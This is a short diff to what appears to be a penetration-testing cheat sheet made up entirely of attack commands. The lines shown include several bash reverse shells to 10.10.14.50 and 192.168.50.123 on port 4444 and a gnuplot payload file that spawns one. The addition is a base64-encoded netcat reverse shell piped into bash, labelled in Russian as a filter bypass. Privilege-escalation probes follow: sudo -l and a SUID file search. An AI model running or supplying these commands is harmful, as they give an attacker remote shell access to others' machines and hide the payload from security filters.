@@ -37,6 +37,8 @@ bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
 /bin/bash -c 'bash -i >& /dev/tcp/192.168.50.123/4444 0>&1'
 echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.plt
 
+echo bmMgMTkyLjE2OC41MC4xMjMgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | bash   (обход фильтрации)
+
 Sudo -l
 find hacker -exec whoami \;
 find / -perm -u=s -type f 2>/dev/null
